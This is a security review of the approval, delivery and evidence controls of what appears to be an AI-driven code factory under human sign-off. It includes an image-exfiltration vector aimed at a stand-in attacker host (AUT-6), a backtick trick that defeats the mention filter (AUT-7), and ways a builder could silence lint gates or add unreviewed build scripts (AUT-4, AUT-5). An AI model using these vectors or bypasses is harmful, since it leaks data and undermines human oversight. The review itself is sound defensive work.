# Security review of authority, approval, delivery and the evidence chain

- Reviewer: the security specialist, working independently. I wrote none of the code under review and changed none of it. My only additions are this document and three new test targets.
- Date: 2026-10-28. Reviewed commit: `7f7c94d` (`feat/slice-0-foundation`; the worktree was fast-forwarded from `119607d`).
- Question: can a pull request reach a human, or be marked approved or delivered, that should have been blocked; can the factory merge, approve or promote anything on its own; can evidence be forged, replayed or detached from its commit; can authority be obtained by a hostile issue author, repository or model output.
- Environment: one macOS laptop, cargo 1.98.0, the testkit's fake GitHub on the loopback interface, the in-memory store, and for one run the real PostgreSQL of the full test-mode run. No real GitHub, no App key, no real branch protection, no Docker, no model calls.
- Evidence: 28 new tests in three targets. **11 are confirmed defects and fail today; they are `#[ignore]`d so CI is unchanged. 17 are probes that held and pass today.** No `[[test]]` line was needed and no existing file was edited. One existing test was changed temporarily, to read the reason of a refusal, and restored with `git checkout`; see AUT-2.
- Checks run: `cargo fmt --all -- --check` passes. `cargo clippy --workspace --all-targets --locked -- -D warnings` passes. `cargo xtask check-architecture` passes. The secret scan passes (rerun after the commit; see section 9).

## 1. Verdicts

| Area | Verdict |
|---|---|
| A. GitHub adapter (App JWT, installation tokens, change host, text sent to GitHub, preflight source) | **PASS WITH CONDITIONS** |
| B. Authority and approval policy (numeric id, designations, separation of duties, tiers, tighten-only) | **PASS WITH CONDITIONS** |
| C. Delivery and approval stages (draft PR, binding, 72-hour window, the service and the hook) | **PASS WITH CONDITIONS** |
| D. Gates framework (results recorded by the factory, definitions from the base, BLOCKED by default, parsers, scope and protected-path gates) | **PASS WITH CONDITIONS** |
| E. Evidence and ledger (binding, manifest, hash chains, tamper resistance) | **PASS WITH CONDITIONS** |
| F. Comment-command parsing | **PASS** for the parser and the judge. **Not connected to anything.** |

Overall: **PASS WITH CONDITIONS**. I found no High finding. Nothing I tried lets a stranger approve, merge or mark ready, forge a gate report, replay an approval for another head, or take a token for a second repository. The authority core holds against every attack I could build from the repository: the numeric id decides, a login decides nothing, the engine refuses the requester as approver at every tier, and the adapter has no call that merges or marks a pull request ready.

**Why not PASS.** Three things matter most.

1. **The risk tier and the separation-of-duties facts at approval come from the architect's design, not from the change (AUT-10).** The policy says the tier is computed from the trusted diff. The code computes it from what the design said it would touch, and drops the intake classifier's raise on the way. A change that touches a sensitive file the design did not list is shown to the approver as an ordinary change.
2. **The approval is bound to a base commit but not to the base branch (AUT-1), and a head moved by anyone else is answered as "unavailable" instead of "moved" (AUT-2).** The second one also means the full run's own stale-head test passes for the wrong reason: its audit record says `code=gave_up`, not `new_commit`. I ran it.
3. **Two controls the policy names have no code: `lint_relaxation` and `build_script_added` (AUT-4, AUT-5).** A builder can silence the lint gate with one attribute in its own source and add a `build.rs` that no gate holds for a security review.

Two older residuals stay open and are carried here because they sit on the approval path: the audit log is still not an authenticated command channel (AUT-12, the R-1 of the API review), and an issue can still be edited between the label and the first snapshot (AUT-11, the R-15).

**What the verdict does not cover.** Everything that needs the real GitHub (section 6), a worker that runs the delivery and approval stages (none exists, see AUT-13), and the parts I did not reach (section 7).

## 2. Severity scale

High: an unauthorised party approves, merges, forges evidence or takes a credential. Medium: a control the documents promise is weaker or missing, or a bypass needs write access to the repository or to the database login. Low: defence in depth, a wrong reason, a latent problem. Info: worth knowing.

## 3. Findings

Run one defect with
`cargo test -p <crate> --test <target> --locked -- --ignored <name> --exact`
and all of a target with `-- --ignored aut_`. Crates and targets: `factory-workflow` / `authority_security_review`, `factory-github` / `security_review`, `factory-composition` / `approval_security_review`. All commands start at the worktree root and take `CARGO_INCREMENTAL=0 CARGO_PROFILE_DEV_DEBUG=0` on a tight disk. Test names under `gates::` are in the file `gates.rs` of the workflow target.

| ID | Severity | Status | Finding | Owner |
|---|---|---|---|---|
| AUT-1 | Medium | Confirmed | An approval is recorded for a pull request that was retargeted to another base branch | `workflow` (approval) |
| AUT-2 | Medium | Confirmed, and run | A head pushed by anyone else is answered "unavailable"; `HeadMoved` and the invalidation of recorded approvals are unreachable | `workflow`, `composition` |
| AUT-3 | Low | Confirmed | A person holding only `security_approver` cannot complete an approval through the engine | `composition`, `workflow` |
| AUT-4 | Medium | Confirmed | `lint_relaxation` is named in the policy and implemented nowhere | `workflow` (gates) |
| AUT-5 | Medium | Confirmed | `build_script_added` and the "sensitive file" hits have no consumer at gate time | `workflow` (gates) |
| AUT-6 | Medium | Confirmed in the filter; rendering unverified | An image survives the outbound text filter inside a link to an allowed host | `github` |
| AUT-7 | Low | Confirmed in the filter; rendering unverified | A lone backtick switches the mention and cross-repository filters off | `github` |
| AUT-8 | Low | Confirmed, latent | "No evidence" and "all not applicable" are published as `neutral`, which a required check accepts | `github`, `workflow` (delivery) |
| AUT-9 | Low | Confirmed | The acknowledgement comment of the approval stage is posted with a read-only token | `workflow`, `github` |
| AUT-10 | Medium | Confirmed by reading | Risk tier and separation facts at approval come from the design, not the diff; the agent's raise is dropped | `workflow`, `composition` |
| AUT-11 | Medium | Confirmed by reading (carried: R-15) | The first request snapshot is the live issue at intake time, with no check against the label | `workflow` (intake), `ports` |
| AUT-12 | Medium | Confirmed by reading (carried: R-1) | A `decision.requested` row carries no proof that the API wrote it | `composition`, `apps/api` |
| AUT-13 | Info | Confirmed | No binary assembles the delivery stage, the approval stage, the approval service or the preflight | `composition`, `apps/worker` |
| H-1 to H-9 | Low or Info | Hypothesis | Section 4; no test | various |

### AUT-1. The pull request's base branch is never compared (Medium, confirmed)

- **Evidence.** The ports return it: `PullRequestState::base` (`crates/ports/src/githost.rs:344`). Nobody reads it. `ApprovalService::submit` reads the pull request (`service.rs:209-219`), takes the head from it, and reads the live tip of the branch named in the *request* (`service.rs:224-228`). `Live` in `judge.rs:38-55` has no field for the pull request's base. The approval handler compares the head branch and the head commit (`handler.rs:268-274`) and not the base.
- **Shown by.** `gates::aut_1_an_approval_is_refused_when_the_pull_request_targets_another_base_branch`. The code host reports the draft as targeting `release` instead of `main`; the approval is applied (`Ok(Applied)`). The control `gates::held_aut_1_the_same_approval_applies_when_nothing_moved` shows the same approval applies when nothing moved.
- **Impact.** The policy binds an approval to `base_sha` (`approval.yaml` `approval_binding.binds_to`). The factory binds it to the commit of a branch *name* it stored, so anyone with write access can move the draft to a branch with weaker protection after the request is made, and an approver who follows the procedure records an approval for a pull request that merges elsewhere. The person sees the target on GitHub, which limits this to an inattentive approver and a writer; it is still the binding the documents promise.
- **Smallest fix.** Add `pr_base: &BranchName` to `Live`, fill it from `state.base`, refuse with a `BaseMoved`-like reason when it differs from `request.base_branch`. Do the same in the handler's check at `handler.rs:268`.

### AUT-2. A moved head is "unavailable", not "moved" (Medium, confirmed and run)

- **Evidence.** `submit` reads the tree of the live head before it judges (`service.rs:249`). The real source answers `NotFound` for a commit the job's object store does not hold (`composition/src/delivery.rs:349`, `UnknownCommit`), and that is every commit that someone else pushes. `From<SeamError>` turns it into `ServiceError::Unavailable`. The hook treats that as "try again" and gives up after `MAX_TRIES = 20` passes (`decisions.rs`, `Reason::GaveUp`). `Refusal::HeadMoved` and the `invalidate_approvals(NewCommit)` that goes with it (`service.rs:599-606`) are never reached. `ApprovalService::head_changed` (`service.rs:625`) has no caller outside tests.
- **Shown by.** `gates::aut_2_a_head_pushed_by_someone_else_is_refused_as_a_moved_head` (the rig's `tree_of` answers `NotFound` for a commit the job does not hold, as the real source does; the result is `Err(Unavailable)`). And by the full run: I added one assertion to `break_an_approval_given_for_a_stale_head_is_refused_and_moves_nothing` for `code=new_commit`, ran it (19 s, real PostgreSQL), and the audit record says `decision.rejected ... code=gave_up`. I restored the file with `git checkout`.
- **Impact.** Fails closed: nothing is approved. But the claimed negative test for NT-MRG-03 passes for the wrong reason; the person is told "ask again" and not "the pull request changed"; each retry costs GitHub calls; and an approval already on record for the old head is not invalidated. Because `valid_approvals` filters by `pr_head_sha`, the stale approval cannot count at a new head, so the harm is the missing signal, not a wrong pass.
- **Smallest fix.** Judge the cheap facts (head, base, open, draft) before reading the tree, or treat `NotFound` from `tree_of` for a head that differs from the request's as `HeadMoved`. Wire `head_changed` to the `pull_request` webhook hint (`WebhookHint::PullRequestChanged` exists). Make the full run's test assert `new_commit`.

### AUT-3. `security_approver` alone cannot complete an approval (Low, confirmed)

- **Evidence.** The critical tier names `security_approver` only (`approval.yaml` `risk_tiers`, `approver_roles`), and `count_distinct` counts only that designation there (`service.rs:663`). The engine then needs `HumanRole::Approver` for the last approval (`engine/decide.rs:193`), and `StoreAuthority::roles` maps `SecurityApprover` to `HumanRole::SecurityApprover` and nothing else (`composition/src/authority.rs:182`). The service's own rig gives its security approvers both roles to make the tier pass (`tests/delivery/approval.rs`).
- **Shown by.** `aut_3_a_person_with_only_the_security_approver_role_can_complete_an_approval` (`Err(NotAuthorized("an approval needs an approver other than the requester"))`); `held_aut_3_the_approver_role_is_what_the_engine_asks_for` shows the role the engine accepts.
- **Impact.** Fails closed. The practical risk is that operators grant both designations to make critical changes pass, and nobody writes down that this is required.
- **Smallest fix.** Let the engine accept `SecurityApprover` for an approval of a critical-tier request, or document that the designation list of a security approver must include `approver`, and test the allowlist for it.

### AUT-4 and AUT-5. Semantic checks the policy names and the code lacks (Medium, confirmed)

- **Evidence.** `policies/security.yaml:1211-1215` lists `lint_relaxation` ("lint level lowered, allow attributes added, ignore lists grown", blocks until a person approves), `build_script_added` (blocks until a security review) and `privilege_or_network_widening`. The host-side gates are `protected::check`, `weakening::weakened` and the secret scan (`stages/validation/host.rs:81`). `weakened` looks for skipped and ignored tests and for `harness = false` (`weakening.rs:25`). Nothing in `crates/` outside the supply-chain gate names `lint_relaxation`; `**/build.rs` is in the `sensitive_files` group (`security.yaml:368`) and the group's "sensitive" hit is read only by `measure(design)` at design time, never at gate time.
- **Shown by.** `gates::aut_4_a_new_allow_attribute_is_seen_by_a_host_side_gate` (`#![allow(warnings)]`, `#![allow(clippy::all)]`, `#![allow(unused)]` added to `src/lib.rs`: no refusal) and `gates::aut_5_a_new_build_script_is_blocked_until_a_security_review` (an added `build.rs` is allowed by the path gate and by `weakened`).
- **Impact.** An in-source `#![allow(warnings)]` outranks the `-D warnings` of the lint command (the fixture manifest runs `cargo clippy --all-targets --locked -- -D warnings`; I checked the rule with `rustc -D warnings` on a file with an unused variable: exit 1 plain, exit 0 with the attribute), and the lint gate reads only the exit code (`gates/command/verdict.rs:112-118`). So the lint evidence says PASSED for code that has warnings. A new `build.rs` runs code in every build, here and after the merge. In both cases a person still sees the diff; the gate evidence they are told to rely on is what is wrong.
- **Smallest fix.** Add the two checks to `weakened`'s neighbour in `host.rs` and make a hit a failed host-side result, with the policy's `blocks_until` as the disposition. Test with the two tests above.
- **Held next to it.** CI files, `CODEOWNERS`, `clippy.toml`, `rustfmt.toml`, `deny.toml`, `.cargo/**`, `rust-toolchain.toml`, `.specify/**`, `CLAUDE.md`, `AGENTS.md` are refused for an add and a change, and a rename or copy into or out of them is refused (`held_ci_gate_ownership_and_agent_instruction_files_are_refused`, `held_a_rename_or_copy_into_or_out_of_a_protected_path_is_refused`).

### AUT-6. An image survives inside a link to an allowed host (Medium, confirmed in the filter)

- **Evidence.** `neutralize_links` removes a bare image, but for a link whose address is allowed it copies the whole link, label included (`text.rs:239-246`, `whole`). The pass that removes bare URLs looks only for `http://`, `https://` and `www.` (`text.rs:319-323`). So `[![chart](//attacker.test/b.png?d=1)](https://github.com/example-org/fixture)` is written to the pull request body unchanged. A reference form (`[![chart][r]](https://github.com/...)` with `> [r]: //attacker.test/b.png`) passes too, because `drop_definitions` looks only at lines that start with `[`.
- **Shown by.** `aut_6_an_image_inside_a_link_to_an_allowed_host_is_removed` and `aut_6_a_linked_image_reference_is_removed`.
- **Impact.** `output_hygiene` says no image reaches GitHub, because an image URL carries data out. Whether GitHub fetches a protocol-relative URL through its image proxy I could not check (no real GitHub), so the exfiltration is a hypothesis; the filter's own contract is what fails. The text that reaches a body is spec and review text derived from model output, so the realistic source is an injected agent.
- **Smallest fix.** Recurse into the label of an allowed link, and treat any `![` or `](//` as an image or link to remove. Add the two vectors to the NT-SEC-04 list.

### AUT-7. A lone backtick switches the mention filter off (Low, confirmed in the filter)

- **Evidence.** `neutralize_tokens` leaves an `@name` alone when the character before it is a backtick (`text.rs:343`) and does the same for `owner/repo#N` (`text.rs:360`). A safe mention is written as a code span with a closing backtick; a hostile lone backtick is not one.
- **Shown by.** `aut_7_a_mention_after_an_unmatched_backtick_is_made_inert` (`Please look, \`@example-org/security-team now` comes back unchanged) and `aut_7_a_cross_repository_reference_after_an_unmatched_backtick_is_made_inert`.
- **Impact.** On GitHub a backtick without a closing one starts no code span, so I expect a live mention that notifies a person or a whole team, and a back-link in another repository. Rendering unverified. The existing NT-SEC-04 test cannot catch it: it asserts only that every `@` is *preceded by* a backtick, which the attack satisfies.
- **Smallest fix.** Decide "inside a code span" by tracking matched backticks, or ignore the preceding character and always write the span.

### AUT-8. "No evidence" is published as neutral (Low, confirmed, latent)

- **Evidence.** The port says "success, skipped and neutral count as passing" for a required check (`ports/src/githost.rs:359`). `conclusion_for_gates(&[])` and an all-`NOT_APPLICABLE` set return `Neutral` (`github/src/changes.rs:67-77`, and the copy in `delivery/checks.rs:49-59`), and the comment on it says "no evidence is not a pass".
- **Shown by.** `aut_8_no_gate_reports_is_not_a_conclusion_that_passes_a_required_check`.
- **Impact.** A ruleset that requires `factory-validation` is satisfied by such a check. Today the delivery stage cannot build one (`parse_validation` refuses an empty report list, `delivery/input.rs:286`), so this is latent.
- **Smallest fix.** Answer `ActionRequired` for an empty set, and decide on purpose whether an all-not-applicable stage may satisfy a required check.

### AUT-9. The acknowledgement cannot be posted (Low, confirmed)

- **Evidence.** The service posts "The decision ... is recorded" as stage `Approval` and discards the answer (`service.rs:428`). `may_write` is true only for `Delivery` (`permissions.rs:140`), so the token is read-only.
- **Shown by.** `aut_9_the_approval_stage_can_post_the_acknowledgement_it_tries_to_post` (`Err(Forbidden)`).
- **Impact.** The decision is recorded first, so no authority is lost. The person is not told, and the comment looks like a feature that works.
- **Smallest fix.** Post the acknowledgement as part of the delivery-stage scope, or give the approval stage a comment-only token. Not the first; it widens a stage.

### AUT-10. The tier at approval comes from the design (Medium, confirmed by reading)

- **Evidence.** `StoreDeliverySources::target` builds the risk facts as `either(job_facts, measure(&design, &policy))` (`composition/src/delivery.rs:276`). `job_facts` is `RiskFacts::default()` (`composition/src/risk.rs`, the static profile). `measure` reads `design.touched()`, the files the *architect* said it would touch (`architecture/risk.rs:103`). Both the delivery handler and the approval handler then call `assess(&target.risk, None)` (`delivery/handler.rs:260`, `approval/handler.rs:360`). `DeliveryTarget` has no field for the classifier's claim, and the architecture stage did pass it (`architecture/risk.rs:157`).
- **Why the diff can differ.** The implementation stage keeps the change inside the files the *task plan* owns (`implementation/gates.rs:193-223`), but the plan check demands that every design element is served by some task, not that the tasks own only what the design touches (`gates/dag/matrix.rs:126`). So a plan may own a sensitive file the design never listed, and the tier, `sensitive_file_change` and `new_dependency` shown to the approver come from the design.
- **Impact.** `policies/approval.yaml` says `computed_by: policy_engine_from_trusted_diff_and_spec`. The wrong tier changes how many approvers are needed, whether the extra reviewers apply, and the separation-of-duties facts the judge reads. The engine's own refusal of the requester as approver keeps the worst case closed, and a protected path is still a failed gate, so I rate it Medium. The route by which a hostile plan gets there is a hypothesis; the missing computation is not.
- **Smallest fix.** Measure the facts from the exported patch in the delivery stage (the host already has `export.changes` and the path policy, `delivery/handler.rs:231-251`), take the maximum with the design's, and pass the intake claim through `DeliveryTarget`. No test: the right test needs a delivery world with a plan that owns a sensitive path, which the existing delivery world can build; I left it for the owner so the test matches the fix.

### AUT-11. The first snapshot is not tied to the label (Medium, confirmed by reading; carried from R-15)

- **Evidence.** For a job made by a webhook, `first_request` fetches the issue live at intake time and stores it as revision 1 (`intake/handler.rs:795-827`). `label_actor` returns who applied the label and not when (`ports/src/githost.rs:489`). `Issue::updated_at` is fetched and compared with nothing (grep: no use outside the adapter). NT-AUTHZ-05 covers an edit *after* the snapshot (`revision > 1`).
- **Impact.** The author of an issue edits the body after a requester labelled it and before the worker reaches the job, and the factory works on the text the requester never read, under the requester's authority. The window is the queue delay.
- **Smallest fix.** Keep the issue's `updated_at` from the webhook payload (or the label event's time) with the job, and have `first_request` pause when the live `updated_at` is later. No test: the port cannot express the label time today, so the test belongs with the port change.

### AUT-12. The audit log is still not an authenticated command channel (Medium, confirmed by reading; carried from R-1)

- **Evidence.** The API review's R-1 is marked "Not met" in its section 10.2. `DecisionFields::subject` (`decisions.rs:124`) has no MAC, and `parse_canonical` accepts any subject that is byte for byte the canonical text. The hook then checks authority by numeric id at apply time (R-4) and `submit` judges the binding, so a forged row is limited to what the named person may do now, on facts that are public to a reader of the ledger.
- **Impact.** Whoever holds the credentials of the API database login can write a `decision.requested` row for any approver principal of any tenant it names, with the head and ledger digest it reads, and the worker will apply it as that person. This needs a database credential, not an API token.
- **Smallest fix.** The reviewer's own proposal: a keyed MAC word in the canonical subject, key readable by the API user and the worker user only. Until then record the residual with an owner and a date.

### AUT-13. Nothing assembles these stages (Info, confirmed)

`grep` finds `ApprovalService::new`, `ApprovalHandler::new` and `ProtectionPreflight` only in tests and in the full-run rig. `crates/composition/src/assemble.rs:113-123` says "no worker assembly registers them yet". The preflight has no production source of the administrator's statement (`NoAttestations` is the only one, so a worker built today would cap every repository at L0). This review is therefore of the library code and of the test-mode wiring, not of a deployed worker.

## 4. Hypotheses (no test)

| ID | Status | Hypothesis | Why it matters | How to settle it |
|---|---|---|---|---|
| H-1 | Hypothesis, Low | The set of ended jobs in the token minter is process memory, bounded at 100,000 (`token.rs:40`, `:473`). After a restart, or after 100,000 later jobs, a late call for an ended job would mint a token again. | "After `revoke_job_tokens` every call is Unauthorized" holds only inside one process. | A test that restarts the minter and calls for an ended job; the engine's own refusal of calls for a terminal job may already cover it. |
| H-2 | Hypothesis, Low | `app_identity` is cached after the first answer (`token.rs:349`), and the audit "on the first token of every job" (`:244`) reads the cache. An App widened after start is noticed at the next restart. | The mint request is narrowed anyway, so a wider App does not widen a token. | Change the permissions of the fake App between two jobs. |
| H-3 | Hypothesis, Low | The approval row's validity is `now + 72 h` from the decision (`service.rs:487`), and the request's window is 72 h from its creation (`request.rs`). An approval can count up to 144 h after the request. | The policy says 72. | Read `approval_binding` with the owner. |
| H-4 | Hypothesis, Low | A comment on a pull request with more comments than `max_pages * per_page` (10 pages) is not found by its marker, so the factory posts it again (`client.rs:236`, `changes.rs` `post_comment`). | An attacker who can comment can make the factory repeat itself. | Seed the fake with 1,000 comments. |
| H-5 | Hypothesis, Low | Documentation requirements are derived from heuristics over the builder's own patch (`gates/docs/plan.rs`, `interface_of`). A new flag written in a form the heuristic does not see needs no page. | A gate declared not applicable by the candidate's own file list. I attacked the verdict code, not the heuristics. | A fixture with five spellings of a new flag. |
| H-6 | Hypothesis, Low | The protection preflight runs for jobs waiting for admission only (`preflight.rs`). Protection removed after admission is not seen at delivery or approval. | `level()` reads the stored ceiling (`composition/src/delivery.rs:118`). | Policy says "at each job start", so this is as designed; require a re-run at approval for the first live run. |
| H-7 | Info | `Decision::Override` and `Decision::UnblockRerun` take the policy facts from the command (`policy_permits`, `security_class`, `capability_reprobe_passed`; `commands/decision.rs:72-83`). No caller builds them today (the six verbs do not include them) and `LedgerState::dispositions` is always empty (`composition/src/delivery.rs:336`), so a blocked gate is never "decided". | When someone wires an override verb, the facts must be computed by the factory, never read from the request. | Requirement R-L8 below. |
| H-8 | Info | Every API decision is recorded with channel `dashboard` (`decisions.rs:1163`); the table has no `api` or `cli` value. | Audit quality only. | Add the channel to the grammar. |
| H-9 | Info | `designations_on` merges duplicate entries of one person (union), while `read()` refuses them. A duplicate cannot widen what one entry grants, and the approval path (`read()`) fails closed on it. | Two readers of one file disagree. | Make `entries()` refuse duplicates for every reader. |

## 5. The claimed negative tests, as a map

"Valid" means the test can fail for the right reason against the real adapter or the real code. I read each test named; I did not mutate the code under test.

| Claimed test | Verdict | Why |
|---|---|---|
| NT-MRG-03 `negative_nt_mrg_03_the_head_moving_after_approval_invalidates_the_approval` and `..._a_refusal_for_a_moved_head_also_ends_the_approvals_on_record` (`delivery/approval.rs`) | **Right reason, unreachable in production** | Its `Fixed::tree_of` answers a tree for every commit. The real source answers `NotFound` for an unknown one, so the refusal the test checks is never reached (AUT-2). |
| Full run `break_an_approval_given_for_a_stale_head_is_refused_and_moves_nothing` | **Wrong reason** (ran) | It asserts only `decision.rejected` and no approval row. The reason is `gave_up`. |
| Full run `break_an_approval_of_another_specification_draft_is_refused_and_moves_nothing` | Valid | It asserts `code=draft_moved`. Note the spec approval is found by a time window, not by a draft hash (`composition/src/specs.rs`, `approval`); the hook checks the draft just before the engine records, which is sound while the run waits. |
| NT-SEC-04 `negative_nt_sec_04_markdown_cannot_carry_data_out_through_any_path_to_the_code_host` | **Weak** | The vector set has no linked image and no lone backtick, and its mention check ("preceded by a backtick") is satisfied by the attack (AUT-6, AUT-7). |
| NT-MRG-05 `negative_nt_mrg_05_there_is_no_verb_for_merge_deploy_or_ready` | **Narrow** | It tests the parser's verbs. Rule DEP-09 checks method-name prefixes of the `ChangeHost` trait only. My `held_the_adapter_has_no_call_that_merges_or_marks_ready` pins the adapter's HTTP methods and paths. |
| NT-MRG-06 `negative_nt_mrg_06_a_bot_an_app_and_the_requester_on_a_risky_change_do_not_count` | Valid at its level | Pure `judge`, specific reason asserted. The flags it sets by hand (`protected_path_change` and the rest) are what AUT-10 says are computed from the wrong source. |
| NT-MRG-03 `negative_nt_mrg_03_the_second_approver_alone_does_not_pass_a_critical_change` | **Masks AUT-3** | Its security approvers hold both engine roles. |
| NT-MRG-01, NT-MRG-02 (`negative_nt_mrg_01_*`, `negative_nt_mrg_02_*`) | Valid | Real engine, in-memory store, real policy; they check the stage run did not move. |
| NT-AUTHZ-01, 02, 04 (domain, workflow, github) | Valid | Numeric id, lookalike login, removal, no reply to an outsider. My composition probes agree. |
| NT-AUTHZ-05 (issue edited after authorization) | **Covers half** | It covers an edit after the snapshot. The window from label to snapshot is AUT-11. |
| NT-AUTHZ-06, 07, 09 (`github/tests/negative_tokens.rs`) | Valid against the fake server | They check the mint request body and the answer. The fake (FX-GH) models GitHub from its documentation; nothing was recorded from the real service. |
| NT-MRG-07 (preflight) | **Fixtures are documentation, not recordings** | `protection.rs` says so itself ("UNVERIFIED against the real GitHub"). |
| NT-LSE-03 (one PR per retry) | Valid | The adapter's `find_open` and the 422 race branch are exercised against the fake. |
| NT-GATE-04 (rename and normalization tricks) | Valid | My `held_a_rename_or_copy_...` agrees. |
| NT-AUD-01 (`storage/tests/audit.rs`) | Not re-run | Relied on `docs/reviews/database-review.md`. |

## 6. What held

- **Authority.** Only the numeric id grants a designation; a login, `author_association`, a GitHub permission and an admin or owner role grant nothing. An entry for another tenant, an expired entry (at the exact second), an entry narrowed to other repositories, a bot and an App each take authority away, never add it. A wrong allowlist file (typo, bad date, duplicate, unknown field, version 2, id 0, empty, missing) makes every reader fail closed (`held_a_wrong_allowlist_file_grants_nobody_anything`). Domain tests agree (`crates/domain/tests/policy/authority.rs`).
- **No self-approval.** The engine refuses the requester as approver at every tier (`held_the_engine_refuses_the_requester_as_approver`), which is stricter than the policy's low-risk allowance, and the judge adds the policy's separation rules.
- **The approval record.** `approvals` has a composite foreign key from `(tenant, job, stage_run)`, a human-only key to `principals`, a unique key per `(stage_run, approver, decision, pr_head)`, and a trigger that allows one invalidation and nothing else (`migrations/...000800`). An approve without the binding is refused by the table.
- **The binding.** Six values (implementation result, base commit, head commit, policy hash, image digest, definition hash), compared at delivery and again at each approval; gate definitions are read from the base commit (`validation/handler.rs:195-221`, `DefinitionSource::ProtectedBaseBranch`). The ledger head the person saw must be the head now.
- **Draft only, never merged.** `Method` has no PUT; no source file of the adapter names a merge or ready endpoint, a GraphQL call or auto-merge (`held_the_adapter_has_no_call_that_merges_or_marks_ready`). A pull request that comes back ready is closed. Only `factory/` branches take a push, and a head of `main` is refused (`held_a_push_target_for_the_default_branch_is_refused`).
- **Tokens.** One repository per token, the answer checked and a wider token revoked at once, permissions asked per stage, tokens registered with the redactor, revoked at job end and by a sweep, JWT claims fixed, `iat` 60 s back and `exp` 120 s ahead, key under 2,048 bits refused (`token.rs:382-437`, `jwt.rs`).
- **Idempotent pull request.** `find_open` before create, and on a lost race (422) a second `find_open`; the body write carries the head sha in its tag, so a manifest for one commit cannot overwrite the page of another.
- **Gates.** Missing evidence is BLOCKED (`resolve.rs`, INV-06); a reviewer's PASS cannot outweigh a failed or blocked gate; a fake component cannot make evidence for a production job (`evidence.rs`); the libtest reader accepts a run only when both streams add up and refuses `harness = false`, so a forged line, a forged summary or a count that does not add up is BLOCKED, not PASSED (`libtest.rs`, `weakening.rs`). An unclassified change is tier High, not Low (`risk.rs:213`).
- **Text to GitHub.** Secrets block the call; userinfo links, other hosts, bare images, HTML, comments, hidden characters and `www.` links are neutralized (`held_links_to_other_hosts_and_bare_images_are_removed`, and NT-SEC-04). The two holes are AUT-6 and AUT-7.
- **Comment commands.** Only the first line, only with the exact prefix; a quote, a fence, an indent, other case, a full-width slash, a no-break space, a zero-width character, a byte-order mark and a second line are not commands; a key after the reason is part of the reason; a head or a digest that is not well formed is refused; a reason is bounded; merge, ready, undraft and deploy are unknown verbs in all three channels (`crates/composition/tests/approval_security_review`). The judge refuses an edited comment, a comment by someone other than the sender, another comment, and a changed body.
- **The hook.** R-2 to R-13 of the API review as the engineer reported them: canonical subject, tenant transaction, authority read at apply time, one effect per command id, a marker for every outcome. I read the authority and marker code and found no gap beyond AUT-12.
- **Chains.** The ledger is verified in Rust before each delivery (`composition/src/delivery.rs:319`, `verify_chain`), not by the database function alone.

## 7. What I could not verify, and what I did not reach

**Could not verify.**

- **Anything about the real GitHub.** How it renders AUT-6 and AUT-7 text; whether it proxies a protocol-relative image; the shape of the rules answer and whether `integration_id` pinning appears as modelled; ETag behaviour of `GET /pulls/{n}` under a push; that `iss` may be a string; that the token answer lists `repositories` as modelled; that a `neutral` check satisfies a ruleset (the port says so; I took it).
- **A real App key, a real branch protection, a real bypass list.** The preflight is judged against documentation-written fixtures.
- **A deployed worker.** AUT-13. The full run uses the testkit's fake change host, fake issue source, fake sandbox and fake workspaces, so the real adapter and the real approval service have never run together.
- **The database layer.** I did not re-run the ledger and audit suites; the database review owns them. I did not try to disable triggers or truncate with a role.
- **The comment channel end to end.** No route feeds it.

**Did not reach.** Reviewer isolation from builder text (NT-INJ-06) and prompt assembly; the specification stage's judge and the DAG validator beyond the ownership check; the documentation gate's claim checks and the readability gate; secret-scan patterns; the sandbox, egress and runtime crates; the webhook verifier and the API (the API review covers them); the other six breaks of the full run beyond the stale head and the other draft; coverage numbers and the supply-chain gates (the supply-chain review covers them).

## 8. Requirements

**On the deployment.**

- **R-D1.** A ruleset on the default branch of every repository with: pull request required, code owner review required, dismiss stale reviews on push, non-fast-forward and deletion blocked, `factory-validation` and `factory-review` required and pinned to the App's integration id, and the App on no bypass list. Until AUT-1 is fixed, remember that anyone with write access can change the base of a draft pull request, so keep write access to the people you would trust with the approval.
- **R-D2.** `CODEOWNERS` covering `.github/`, `CODEOWNERS`, `.factory/`, `policies/`, and every `build.rs` and `Cargo.toml`, owned by people who are not the requesters (AUT-4, AUT-5 until fixed).
- **R-D3.** The App installed on the repositories named and no others, with exactly the permissions of `policies/security.yaml`; re-read the App's permissions at each release, because the adapter reads them once per process (H-2).
- **R-D4.** The API database login narrowed as the API review's D-7 says, and the MAC of AUT-12 in place or the residual recorded with an owner and a date.
- **R-D5.** The allowlist file in a protected checkout, replaced atomically, with the `approver` designation on every `security_approver` until AUT-3 is closed.

**On the first live run.**

- **R-L1.** Close AUT-1, AUT-2, AUT-6, AUT-10 and AUT-11 first. Close AUT-4 and AUT-5 or put R-D2 in force. The rest can follow.
- **R-L2.** Record one real response of the rules endpoint, one real App `GET /app`, one real installation-token answer, and one real `GET /pulls/{n}` after a push, and turn each into a fixture before the preflight and the tokens are trusted.
- **R-L3.** Render the AUT-6 and AUT-7 vectors on a throwaway repository and look. If a protocol-relative image is fetched, AUT-6 is High.
- **R-L4.** Run the first job with `autonomy: L1` and a person watching the audit log; check the `approval.recorded` row carries the allowlist hash, the policy hash and the binding.
- **R-L5.** Re-run the preflight at delivery and again at approval, and refuse above L0 if it fails (H-6).
- **R-L6.** Put the stale-head test of the full run on `code=new_commit` once AUT-2 is fixed.
- **R-L7.** Check by hand that the pull request the factory opens is a draft, targets the default branch, and that no merge or ready button is offered to the App.
- **R-L8.** Before any override or unblock verb is added, compute `OverrideFacts` and the unblock facts in the worker from the policy and the gate report, never from the request (H-7).
- **R-L9.** Give `StoreDeliverySources::ledger` a way to cross-check the job's head against `jobs.ledger_head_hash` and an external copy; the hourly anchor of the database review is still unbuilt, and a removed tail passes `verify_chain`.

## 9. How I worked

I read the approval service, the judge, the handler, the delivery stage and its input, the engine's decide path, the authority policy, the composition sources and the hook, the adapter's change host, tokens, JWT, issue source, protection reader and text filter, the gate resolver and evidence checks, the libtest and verdict readers, the host-side gate runner, the scope gates, the risk code, and the storage side of approvals. I attacked each with a concrete input before I wrote a test, ran every defect test to see it fail, and ran the full-run stale-head test once to see its reason.

The three new targets are `crates/workflow/tests/authority_security_review/` (11 tests, one rig), `crates/github/tests/security_review/` (10 tests) and `crates/composition/tests/approval_security_review/` (7 probes). I did not write a target under `crates/domain/tests/security_review/`: the domain's authority and policy tests already cover the attacks I made there, and a duplicate adds nothing. The test names are the ones in the finding table. No test contains a secret-shaped literal; none builds a credential.
